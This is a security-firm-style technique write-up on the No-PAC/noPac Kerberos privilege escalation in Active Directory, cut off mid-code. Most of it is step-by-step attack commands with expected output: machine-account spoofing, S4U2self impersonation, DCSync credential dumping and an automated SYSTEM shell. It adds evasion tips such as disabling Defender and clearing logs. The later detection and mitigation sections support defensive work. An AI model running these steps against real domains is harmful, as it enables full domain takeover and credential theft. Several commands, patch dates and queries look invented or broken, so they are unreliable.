# [CA-KERB-011]: No-PAC Kerberos Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-011 |
| **MITRE ATT&CK v18.1** | [T1558: Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A (Related: CVE-2014-6324, CVE-2021-42278, CVE-2021-42287) |
| **Technique Status** | ACTIVE (pre-April 2025); PARTIAL (April 2025+); DEPRECATED (June 2025+) |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Server 2016-2025 (pre-patch) |
| **Patched In** | KB5055523 (April 2025, mandatory enforcement); KB5060842 (June 2025, full remediation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 8 (Splunk Detection), and 12 (Microsoft Defender for Cloud) not included because: (1) No Atomic Red Team test exists for pure No-PAC; (2) No specific Splunk signature for PAC-less tickets alone; (3) Detector for Cloud primarily applicable to noPac chain (CVE-2021-42278/42287), not standalone No-PAC. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** The No-PAC Kerberos bypass attack exploits a vulnerability in how Windows Active Directory Key Distribution Centers (KDCs) validate Privilege Attribute Certificates (PACs) within Kerberos tickets. An attacker can request a Ticket-Granting Ticket (TGT) without including a PAC by setting the PA-PAC-REQUEST pre-authentication attribute to false. Once the PAC-less TGT is obtained, the attacker forges a fake PAC with elevated group memberships and injects it into a Ticket-Granting-Service (TGS) request using the 'enc-authorization-data' field. Critically, the vulnerable KDC does not properly validate the forged PAC signature and instead copies it directly into the service ticket, allowing the attacker to impersonate high-privilege accounts such as Domain Admins. This technique evolved from MS14-068 (CVE-2014-6324) and was further refined during the CVE-2021-42278/42287 (noPac) exploitation chains. The attack does not require knowledge of the krbtgt hash and can be performed by any authenticated domain user.

**Attack Surface:** Kerberos pre-authentication (PA-PAC-REQUEST field), KDC ticket validation logic, TGS-REQ processing, enc-authorization-data field handling.

**Business Impact:** **Complete Domain Compromise.** An attacker can escalate from a standard domain user to Domain Administrator without crack ing passwords or stealing hashes. This enables ransomware deployment, data exfiltration, lateral movement to all domain resources, and persistence through backdoored accounts.

**Technical Context:** The attack typically takes 30 seconds to 2 minutes to execute from initial compromise to obtaining elevated tickets. Detection via network monitoring is possible but requires specialized Kerberos packet analysis. Event log analysis is the primary detection vector, but requires proper audit logging configuration.

### Operational Risk

- **Execution Risk:** Medium - Requires understanding of Kerberos protocol and specific tool usage (Rubeus, Impacket). Network connectivity to KDC must be available.
- **Stealth:** Medium - Generates multiple Event IDs (4768, 4769, 4741, 4742, 4781) in the Security log but can be cleared post-exploitation. Modern systems (April 2025+) block the attack entirely via mandatory PAC validation.
- **Reversibility:** No - Once elevated tickets are issued and used, damage is irreversible without domain restoration.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.2.1 | Account Lockout Duration - Kerberos pre-auth security |
| **DISA STIG** | WN11-AU-000502 | Audit account logon events (Kerberos) |
| **CISA SCuBA** | AC-2 | Account Management and Kerberos policy |
| **NIST 800-53** | AC-3 | Access Enforcement - Kerberos validation |
| **GDPR** | Art. 32 | Security of processing - authentication mechanisms |
| **DORA** | Art. 9 | Protection and prevention of ICT-related incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (detection/response) |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights (PAC validation) |
| **ISO 27005** | Risk Scenario | "Compromise of Authentication/Authorization Mechanism" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Authenticated domain user (any user with a valid domain account).

**Required Access:** Network access to domain controller (DC) on port 88 (Kerberos), ability to send AS-REQ and TGS-REQ messages.

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (VULNERABLE pre-April 2025)
- **Kerberos:** Kerberos 5 (all versions)
- **Tools:** Rubeus 1.6.3+, Impacket 0.9.24+, noPac (latest)

**Tools Required:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.6.3+) - Windows/.NET Kerberos tool
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Version 0.9.24+) - Python Kerberos library
- [noPac](https://github.com/cube0x0/noPac) - Automated CVE-2021-42278/42287 exploitation
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) - Interactive noPac shell
- PowerView or Powermad - Machine account manipulation (for full noPac chain)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Reconnaissance Method 1: Ticket Size Analysis (Scanning for Vulnerability)

**Objective:** Determine if the target DC is vulnerable by requesting a PAC-less TGT and analyzing ticket size. Patched DCs will include a PAC regardless of PA-PAC-REQUEST=false, resulting in a larger ticket.

**Windows Command (Rubeus):**

```powershell
# Request a TGT without a PAC to scan vulnerability
Rubeus.exe asktgt /user:<username> /password:<password> /domain:<domain.fqdn> /dc:<dc.fqdn> /nopac /nowrap
```

**What to Look For:**
- **Vulnerable DC:** Ticket size is **small** (typically 500-800 bytes) - indicates PAC was not included
- **Patched DC:** Ticket size is **large** (typically 1500-2500 bytes) - indicates PAC was forcibly included despite PA-PAC-REQUEST=false
- **Output indicator:** Look at the base64 ticket output length

**Automated Scanning:**

```powershell
# Using noPac scanner
noPac.exe scan -domain <domain.fqdn> -user <username> -pass <password> -dc <dc.fqdn>
```

**Expected Output (Vulnerable):**
```
[*] DC dc.domain.local is potentially vulnerable
[*] DC returned a ticket without PAC (size: 682 bytes)
[*] Vulnerability Status: VULNERABLE
```

**Expected Output (Patched):**
```
[*] DC dc.domain.local is NOT vulnerable
[*] DC returned a ticket WITH PAC despite PA-PAC-REQUEST=false (size: 2104 bytes)
[*] Vulnerability Status: PATCHED
```

### Reconnaissance Method 2: Linux/Bash Equivalent

```bash
# Using Impacket (requires valid domain credentials)
python3 -c "
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ
from impacket.krb5.client import Client

# Connect to KDC and observe ticket properties
client = Client('user@DOMAIN.LOCAL', 'password', 'dc.domain.local')
tgt = client.get_TGT()
print(f'TGT Size: {len(tgt)} bytes')
"
```

**Version Note:** For older Impacket versions (0.9.23 and below), ensure krb5.conf is properly configured with Kerberos realm settings.

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: MS14-068 Style PAC Forgery (Impacket goldenPac.py)

**Supported Versions:** Server 2016-2019 (VULNERABLE); Server 2022+ requires April 2025 patch to be UNPATCHED.

#### Step 1: Obtain User SID and Domain SID

**Objective:** Retrieve the victim user's SID and domain SID, which will be embedded in the forged PAC.

**Command:**

```bash
# Using Impacket's lookupsid.py
python3 lookupsid.py domain/username:password@domain.controller.fqdn | grep -A5 "Domain SID"
```

**Expected Output:**
```
Domain SID: S-1-5-21-3623811015-3361044348-30300510
User SID: S-1-5-21-3623811015-3361044348-30300510-1105
```

**What This Means:**
- Domain SID is the unique identifier for the AD forest root
- User SID identifies the specific user account in the domain
- These are embedded in the forged PAC to impersonate privileged group membership

**Troubleshooting:**
- **Error:** "Cannot find domain SID"
  - **Cause:** User credentials are invalid or DC is unreachable
  - **Fix (Server 2016-2019):** Verify DC connectivity and credentials: `nslookup domain.controller`
  - **Fix (Server 2022+):** April 2025 patch may block enumeration; disable PAC validation temporarily via registry

#### Step 2: Forge Golden PAC using goldenPac.py

**Objective:** Create a forged TGT with admin privileges without knowing the krbtgt hash.

**Command:**

```bash
# Using Impacket's goldenPac.py (MS14-068 exploitation)
python3 goldenPac.py domain.fqdn/username:password@domain.controller.fqdn -dc-ip <dc_ip> -target-ip <dc_ip> whoami
```

**Expected Output:**
```
Impacket v0.9.24 - Copyright 2002-2024 Core Security Technologies

[*] Creating TGT with Domain Admin privileges...
[*] PAC forged with group SIDs: 512 (Domain Admins), 513 (Domain Users)
[*] Connecting to domain.controller.fqdn (smb)
[*] Executing 'whoami': 
```

**What This Means:**
- Group SID 512 = Domain Admins (RID 512)
- Group SID 519 = Enterprise Admins
- If successful, subsequent commands execute with admin privileges

**OpSec & Evasion:**
- Run from a compromised workstation, not the attacker's machine
- The goldenPac.py execution logs PsExec connections (Event ID 7045); alternative: save ticket only with `-w <filename>` parameter
- Disable Windows Defender (AMSI) before execution: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Detection likelihood: **High** - Multiple Event IDs generated

**Version Note (Server 2022+):**
- April 2025 patch (KB5055523) introduced mandatory PAC validation
- Workaround: Check registry key `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters` for `ValidatePacSignature` = 0 (deployment mode)
- If value = 1 or missing, PAC validation is enforced and this attack fails

**Troubleshooting:**
- **Error:** "KDC_ERR_SUMTYPE_NOSUPP (15)"
  - **Cause:** Target DC is patched and rejected the forged PAC
  - **Fix (Server 2016-2019):** Verify patch status: `wmic qfe list brief | find "KB5008380"`
  - **Fix (Server 2022):** Check if KB5055523 is applied: `Get-HotFix -Id KB5055523`
  - **Fix (Server 2025):** Deployment mode is the only workaround until June 2025 patch is available

#### Step 3: Use Forged Ticket for Privilege Escalation

**Objective:** Employ the forged ticket to perform privileged actions such as DCSync.

**Command:**

```bash
# Save ticket and use for DCSync
python3 goldenPac.py domain.fqdn/username:password@domain.controller.fqdn -dc-ip <dc_ip> -target-ip <dc_ip> -w /tmp/admin.ccache

# Export ticket and use with secretsdump
export KRB5CCNAME=/tmp/admin.ccache
python3 secretsdump.py -k -no-pass domain.controller.fqdn
```

**Expected Output:**
```
[-] Impacket v0.9.24 - Copyright 2002-2024 Core Security Technologies
[*] Target system bootKey: xxx
[*] Dumping domain credentials (domain\user:hash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxx
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:xxxxx
```

**What This Means:**
- Successful DCSync extraction = complete domain compromise
- krbtgt hash can now be used for Golden Ticket attacks
- Administrator hash enables offline cracking and credential stuffing

---

### METHOD 2: noPac Attack Chain (CVE-2021-42278 + CVE-2021-42287)

**Supported Versions:** Server 2016-2019 (VULNERABLE); Server 2022 (VULNERABLE pre-November 2021); Server 2025 (VULNERABLE pre-April 2025).

#### Step 1: Create Machine Account

**Objective:** Create a new computer account that will be used for sAMAccountName spoofing.

**Command (PowerShell with Powermad):**

```powershell
# Import Powermad
. .\Powermad.ps1

# Create new machine account
$password = ConvertTo-SecureString 'ComputerPassword123!' -AsPlainText -Force
New-MachineAccount -MachineAccount "TESTNOPAC" -Password $password -Domain "domain.local" -DomainController "dc.domain.local" -Verbose
```

**Expected Output:**
```
[+] Machine account TESTNOPAC$ created successfully
[+] Account DN: CN=TESTNOPAC,CN=Computers,DC=domain,DC=local
```

**Command (Linux with Impacket):**

```bash
# Using Impacket's addcomputer.py
python3 addcomputer.py -computer-name 'TESTNOPAC$' -computer-pass 'ComputerPassword123!' -dc-host dc.domain.local -domain-netbios DOMAIN 'domain.local/user:password'
```

**Troubleshooting:**
- **Error:** "Machine account quota exceeded"
  - **Cause:** User has already created 10 machine accounts (default ms-DS-Machine-Account-Quota)
  - **Fix (Server 2016-2019):** Request admin to increase quota or delete old accounts
  - **Fix (Server 2022+):** Same as above; quota enforcement cannot be bypassed post-patch

#### Step 2: Clear Service Principal Names (SPNs)

**Objective:** Remove SPNs from the machine account so renaming doesn't fail.

**Command (PowerShell):**

```powershell
# Clear SPNs using PowerView
Set-Domain-Object -Identity "TESTNOPAC$" -XOR @{servicePrincipalName=$null} -verbose
```

**Expected Output:**
```
[+] Successfully cleared SPNs from TESTNOPAC$
```

**Command (Impacket):**

```bash
# Using ldapmodify or directly via Impacket LDAP
python3 -c "
from impacket.ldap import ldapasn1 as ldapasn1_impacket
# Clear servicePrincipalName attribute
"
```

#### Step 3: Spoof sAMAccountName (CVE-2021-42278)

**Objective:** Rename the machine account's sAMAccountName to match a domain controller's name (without the trailing $).

**Command (PowerShell with Powermad):**

```powershell
# Rename sAMAccountName to spoofed DC name
Set-MachineAccountAttribute -MachineAccount "TESTNOPAC" -Value "DC01" -Attribute samaccountname -Verbose
```

**Expected Output:**
```
[+] Successfully set sAMAccountName to DC01 (machine account sAMAccountName spoofing successful)
```

**Command (Impacket):**

```bash
python3 renameMachine.py -current-name 'TESTNOPAC$' -new-name 'DC01' -dc-ip 'dc.domain.local' 'domain.local/user:password'
```

**What This Means:**
- **CVE-2021-42278** vulnerability: No validation exists to prevent a machine account from using a DC's sAMAccountName without the trailing $
- The DC's sAMAccountName is normally "DC01$"; we're creating a machine account called "DC01"
- This allows the attacker to request a Kerberos ticket for the spoofed "DC01" account

#### Step 4: Request TGT for Spoofed Account

**Objective:** Obtain a valid TGT for the now-spoofed "DC01" machine account.

**Command (Windows with Rubeus):**

```powershell
# Request TGT for spoofed DC account
.\Rubeus.exe asktgt /user:"DC01" /password:"ComputerPassword123!" /domain:"domain.local" /dc:"dc.domain.local" /nowrap
```

**Expected Output:**
```
[+] TGT successfully requested for DC01
[+] Ticket size: 1234 bytes
[+] Base64 TGT: doIFI...
```

**Command (Linux with Impacket):**

```bash
python3 getTGT.py -dc-ip 'dc.domain.local' 'domain.local/DC01:ComputerPassword123!'
```

**OpSec & Evasion:**
- Save ticket to file immediately: `/nowrap > tgt.txt`
- Do not proceed with reset until ticket is safely stored
- Detection likelihood: **High** (Event 4768 logs TGT request for spoofed account)

#### Step 5: Reset sAMAccountName to Original Value

**Objective:** Change the machine account's sAMAccountName back to original, triggering CVE-2021-42287 during S4U2self step.

**Command:**

```powershell
Set-MachineAccountAttribute -MachineAccount "TESTNOPAC" -Value "TESTNOPAC" -Attribute samaccountname -Verbose
```

**Expected Output:**
```
[+] sAMAccountName successfully reset to TESTNOPAC$
```

**What This Means:**
- The KDC now has a cached TGT for "DC01" but the account with that name no longer exists
- When S4U2self is performed, the KDC will try to find "DC01" and default to appending a "$" → finds "DC01$" (the real DC)
- This is **CVE-2021-42287**: KDC bamboozling due to improper account lookup and PAC validation

#### Step 6: Perform S4U2self with Spoofed Ticket (CVE-2021-42287 Exploitation)

**Objective:** Request a service ticket for a domain admin impersonating a high-privilege user.

**Command (Windows with Rubeus):**

```powershell
# Impersonate Domain Admin using S4U2self
.\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/dc.domain.local" /dc:"dc.domain.local" /ptt /ticket:[Base64_TGT_From_Step_4]
```

**Expected Output:**
```
[+] S4U2self succeeded!
[+] Service ticket for Administrator obtained
[+] Ticket injected into current session
[+] (use with pass-the-ticket)
```

**Command (Linux with Impacket):**

```bash
# Using S4U2self via Impacket
export KRB5CCNAME=/tmp/dc01.ccache
python3 getST.py -spn 'cifs/dc.domain.local' -impersonate Administrator -k -no-pass -dc-ip 'dc.domain.local' 'domain.local/DC01'
```

**What Happens:**
- KDC receives S4U2self request with TGT for "DC01" (which no longer exists)
- KDC appends "$" to find the account → matches "DC01$" (real DC)
- **CVE-2021-42287** vulnerability: KDC validates the PAC incorrectly and issues a ticket for "Administrator" using the DC's encryption key
- Result: A valid service ticket for Administrator with DC-level encryption

**Troubleshooting:**
- **Error:** "KDC_ERR_TGT_REVOKED"
  - **Cause:** DC is patched (November 2021+) and rejecting the spoofed TGT due to requester validation
  - **Fix (Server 2022+):** Check KB5008380 status: `Get-HotFix -Id KB5008380`
  - **Fix (Server 2025):** Check if April 2025 patch applied: KB5055523 or later

#### Step 7: Perform Privileged Actions (DCSync, Pass-the-Ticket)

**Objective:** Use the elevated ticket to perform actions as Domain Admin.

**Command (DCSync):**

```bash
# Export ticket and perform DCSync
export KRB5CCNAME=/tmp/administrator.ccache
python3 secretsdump.py -k -no-pass 'domain.local/administrator@dc.domain.local'
```

**Expected Output:**
```
[-] Impacket v0.9.24 - Copyright 2002-2024 Core Security Technologies
[*] Dumping domain credentials
Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxx
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:xxxxx
[*] Dumped all cached domain credentials
```

---

### METHOD 3: Automated noPac Exploitation (sam-the-admin)

**Supported Versions:** Server 2016-2019 (VULNERABLE); Server 2022 (VULNERABLE pre-November 2021).

#### Single-Step Exploitation

**Objective:** Chain all noPac steps automatically with interactive shell access.

**Command:**

```bash
# Run sam-the-admin for full exploitation with shell
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

**Expected Output:**
```
[*] Selected Target dc.domain.local
[*] Total Domain Admins 11
[*] Will try to impersonate gaylene.dreddy
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-XX$"
[*] MachineAccount "SAMTHEADMIN-XX$ password = xxx
[*] Successfully added machine account
[*] Successfully renamed to DC name
[*] Requesting TGT for spoofed DC account
[*] Saving ticket in dc.ccache
[*] Resetting machine account to original name
[*] Using TGT from cache
[*] Impersonating Domain Admin
[*] Requesting S4U2self
[*] Saving ticket in admin.ccache
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```

**What This Means:**
- Automatic exploitation with one-liner
- Result: Interactive shell as SYSTEM (effectively Domain Admin)
- Can execute arbitrary commands on domain controller

**OpSec & Evasion:**
- Command execution is logged in Windows Event Logs (Event 4688, 7045 if using PsExec)
- Disable Defender before exploitation: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Use in-memory execution to avoid disk artifacts
- Detection likelihood: **Very High** (machine account creation is logged)

---

## 6. ATTACK SIMULATION & VERIFICATION

*Atomic Red Team test does not exist for pure No-PAC bypass. Verification is performed by testing ticket issuance and PAC validation on target DC.*

**Manual Verification (Proof of Exploitation):**

```powershell
# After exploitation, verify elevated ticket was obtained
klist
# Output should show cached tickets for Administrator or krbtgt
```

**Post-Exploitation Validation:**

```bash
# Decrypt and examine ticket to confirm PAC contains admin groups
python3 -c "
from impacket.krb5.ccache import CCache

ccache = CCache.loadFile('administrator.ccache')
for principal in ccache.principals:
    print(f'Principal: {principal}')
    for ticket in ccache.tickets[principal]:
        print(f'  Service: {ticket[\"service\"]}')
        # PAC should contain group SIDs 512 (Domain Admins), 519 (Enterprise Admins), etc.
"
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.3+  
**Minimum Version:** 1.6.0  
**Supported Platforms:** Windows (x86/x64)

**Key Commands:**

```powershell
# Request PAC-less TGT (scanning)
Rubeus.exe asktgt /user:username /password:password /domain:domain.fqdn /dc:dc.fqdn /nopac /nowrap

# Request normal TGT
Rubeus.exe asktgt /user:username /password:password /domain:domain.fqdn /dc:dc.fqdn /nowrap

# Perform S4U2self impersonation
Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/dc /ptt /ticket:[base64_tgt]

# Request service ticket
Rubeus.exe tgtdeleg /nowrap
```

---

#### [Impacket](https://github.com/SecureAuthCorp/impacket)

**Version:** 0.9.24+  
**Minimum Version:** 0.9.23  
**Supported Platforms:** Linux/macOS/Windows (Python 3.6+)

**Key Scripts:**

```bash
# Get TGT
python3 getTGT.py domain/username:password@dc.domain.local -dc-ip <dc_ip>

# Golden PAC exploitation (MS14-068)
python3 goldenPac.py domain/username:password@dc.domain.local -dc-ip <dc_ip> -w /tmp/ticket.ccache

# DCSync using Kerberos ticket
export KRB5CCNAME=/tmp/ticket.ccache
python3 secretsdump.py -k -no-pass domain/Administrator@dc.domain.local

# Service Principal Names enumeration
python3 lookupsid.py domain/username:password@dc.domain.local
```

---

#### [noPac](https://github.com/cube0x0/noPac)

**Version:** Latest (GitHub)  
**Platform:** Windows (.NET)

```powershell
# Scan for vulnerability
noPac.exe scan -domain domain.fqdn -user username -pass password -dc dc.fqdn

# Full exploitation (automated)
noPac.exe -domain domain.fqdn -user username -pass password /dc dc.fqdn /mAccount TestMachine /mPassword Password123! /service cifs /ptt
```

---

#### [sam-the-admin](https://github.com/WazeHell/sam-the-admin)

**Version:** Latest (GitHub)  
**Platform:** Linux/macOS/Windows (Python 3.6+)

```bash
# Full exploitation with shell
python3 sam_the_admin.py "domain.local/username:password" -dc-ip <dc_ip> -shell

# Scan only
python3 sam_the_admin.py "domain.local/username:password" -dc-ip <dc_ip> -scan
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Detection Query 1: PAC-less TGT Request

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4768)
- **Required Fields:** TicketOptions, TicketEncryptionType, PreAuthType
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All (Server 2016+)

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4768
| where TicketOptions has "0x40810010"  // TGT request flags
| where TicketEncryptionType == "0x12"  // AES-256-CTS-HMAC-SHA1-96 (typical for PAC-less)
| extend TicketSizeEstimate = strlen(tostring(TargetInfo))
| where TicketSizeEstimate < 1000  // PAC-less tickets are typically < 1000 bytes
| project TimeGenerated, Computer, TargetUserName, TargetLogonGuid, TicketEncryptionType, TicketSizeEstimate
```

**What This Detects:**
- AS-REQ requests with ticket options consistent with PAC-less requests
- Unusually small tickets (absence of PAC)
- Multiple requests from same client within short time frame

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `PAC-less TGT Request Detection`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `6 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

Connect-AzAccount
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "PAC-less TGT Request Detection" `
  -Query @"
SecurityEvent
| where EventID == 4768
| where TicketOptions has "0x40810010"
| where TicketEncryptionType == "0x12"
| where strlen(tostring(TargetInfo)) < 1000
| project TimeGenerated, Computer, TargetUserName, TargetLogonGuid
"@ `
  -Severity "High" `
  -Enabled $true
```

---

#### Detection Query 2: noPac Attack Chain (Machine Account Rename)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event IDs 4741, 4742, 4781, 4768)
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All (Server 2016+)

**KQL Query:**

```kusto
let timeline = 120; // 2-minute window
let MachineCreations = SecurityEvent
| where EventID == 4741  // Computer account created
| project CreatedTime = TimeGenerated, Computer, NewComputerName = TargetInfo;

let MachineSPNClears = SecurityEvent
| where EventID == 4742  // Computer account modified (SPNs cleared)
| project SPNClearTime = TimeGenerated, Computer;

let MachineRenames = SecurityEvent
| where EventID == 4781  // Computer account renamed
| where NewAccountName !endswith "$"  // Renamed without trailing $ = suspicious
| project RenameTime = TimeGenerated, Computer, OldAccountName, NewAccountName;

let TGTRequests = SecurityEvent
| where EventID == 4768  // TGT requested for non-standard account
| where TargetUserName == NewAccountName  // Request for renamed account
| project TGTTime = TimeGenerated, Computer, TGTAccount = TargetUserName;

MachineCreations
| join kind=inner (MachineSPNClears) on Computer
| join kind=inner (MachineRenames) on Computer
| join kind=inner (TGTRequests) on Computer
| where (SPNClearTime - CreatedTime) < timespan(2m)
| where (RenameTime - CreatedTime) < timespan(2m)
| where (TGTTime - RenameTime) < timespan(2m)
| project AlertTime = TGTTime, Computer, MachineCreatedName = NewComputerName, SuspiciousRename = NewAccountName, TGTAccount
```

**What This Detects:**
- Sequence: Machine account created → SPNs cleared → sAMAccountName changed (no $) → TGT requested for non-standard name
- All steps within 2 minutes = high-confidence noPac attack

**Manual Configuration:** Use same Sentinel workflow as Query 1, substituting the KQL above.

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID 4768** (**TGT Requested**):
- **Log Source:** Security
- **Trigger:** Every Kerberos authentication initiation
- **Filter for No-PAC attacks:** Look for tickets smaller than 1000 bytes or without PAC indicators

**Event ID 4769** (**Service Ticket Requested**):
- **Log Source:** Security
- **Trigger:** Service ticket request (TGS-REQ)
- **Filter for noPac:** Account name matches service name without trailing $ (e.g., TGT for "DC01" requesting service for "DC01$")

**Event ID 4741** (**Machine Account Created**):
- **Log Source:** Security
- **Trigger:** Computer account creation
- **Filter:** Rapid creation followed by rename is suspicious

**Event ID 4742** (**Machine Account Modified**):
- **Log Source:** Security
- **Trigger:** Computer account attribute change (e.g., SPNs cleared)

**Event ID 4781** (**Computer Account Renamed**):
- **Log Source:** Security
- **Trigger:** Computer sAMAccountName changed
- **Filter for noPac:** New name without trailing $ is highly suspicious

**Event ID 38** (**TGT Revoked**):
- **Log Source:** System
- **Trigger:** Post-patch DCs rejecting spoofed TGTs
- **Significance:** Indicates attempted exploitation against patched DC

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Account Logon**
4. Enable: **Audit Kerberos Authentication Service** (both Success and Failure)
5. Expand **Detailed Tracking**
6. Enable: **Audit Logon** (both Success and Failure)
7. Run `gpupdate /force` on domain controllers

**Manual Configuration (Local Policy - Server 2022+):**

```powershell
# Enable Kerberos audit logging
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
```

**Splunk SPL for Event Correlation:**

```spl
index=windows source=WinEventLog:Security (EventCode=4768 OR EventCode=4769 OR EventCode=4781)
| stats count by host, EventCode, TargetUserName
| where EventCode=4768 AND EventCode=4781 AND EventCode=4769
| search TicketSize < 1000
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016+

**Sysmon Config Snippet (Registry Access Monitoring):**

```xml
<Sysmon schemaversion="4.22">
  <!-- Monitor registry changes related to Kerberos -->
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">Lsa\Kerberos\Parameters</TargetObject>
  </RegistryEvent>
  
  <!-- Monitor machine account creation via LDAP/SAMR -->
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">lsass.exe</TargetFilename>
  </FileCreate>
  
  <!-- Monitor Rubeus/Impacket execution -->
  <ProcessCreate onmatch="include">
    <Image condition="contains">Rubeus</Image>
    <CommandLine condition="contains">asktgt</CommandLine>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <Image condition="contains">python</Image>
    <CommandLine condition="contains">goldenPac</CommandLine>
  </ProcessCreate>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Apply Critical Kerberos Patches**

Windows Server must be patched with the latest Kerberos security updates:

- **Server 2016:** KB5008380 (November 2021) or later
- **Server 2019:** KB5008380 (November 2021) or later
- **Server 2022:** KB5055523 (April 2025) or later; KB5060842 (June 2025) for full remediation
- **Server 2025:** KB5055523 (April 2025) or later; KB5060842 (June 2025) for full remediation

**Manual Steps (Windows Update):**

1. Go to **Settings** → **Update & Security** → **Check for updates**
2. Download and install all critical updates
3. Restart domain controllers
4. Verify patch: `Get-HotFix | find "KB5008380"` or `find "KB5055523"`

**Manual Steps (Group Policy - Deployment Mode for Server 2022+):**

If automatic enforcement breaks authentication, temporarily enable deployment mode:

1. On each domain controller, open **Registry Editor** (regedit)
2. Navigate to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters`
3. Create or modify DWORD: `StrictKdcPacValidation` = **0** (for deployment/testing only)
4. Restart `Kerberos.exe`: `net stop kdc && net start kdc`
5. **TEMPORARY ONLY:** Revert to **1** or delete value once all clients are updated

**Manual Steps (PowerShell):**

```powershell
# Check patch status
Get-HotFix -Id KB5008380, KB5055523 | Format-Table HotFixID, InstalledOn

# Install Windows updates
Install-WindowsUpdate -AcceptAll -AutoReboot

# Verify Kerberos service after patching
Test-NetConnection -ComputerName <dc_fqdn> -Port 88 -ErrorAction Stop
Get-Service Kerberos | Restart-Service
```

---

**Mitigation 2: Disable PAC-less Ticket Issuance (Post-Patch)**

After patching, enforce PAC validation on all domain controllers:

**Manual Steps (Registry):**

1. Navigate to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters`
2. Create DWORD: `ValidatePacSignature` = **1** (enforce PAC validation)
3. Create DWORD: `StrictKdcPacValidation` = **1** (strict validation mode)
4. Restart Kerberos service: `net stop kdc && net start kdc`

**Manual Steps (PowerShell):**

```powershell
# Enable strict PAC validation
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters"
Set-ItemProperty -Path $RegPath -Name "ValidatePacSignature" -Value 1 -Type DWord -Force
Set-ItemProperty -Path $RegPath -Name "StrictKdcPacValidation" -Value 1 -Type DWord -Force

# Restart Kerberos service
Restart-Service Kerberos -Force

# Verify registry settings
Get-ItemProperty -Path $RegPath | Select ValidatePacSignature, StrictKdcPacValidation
```

**Verification Command (Check if Secure):**

```powershell
# Request a PAC-less TGT; should fail on patched/configured DC
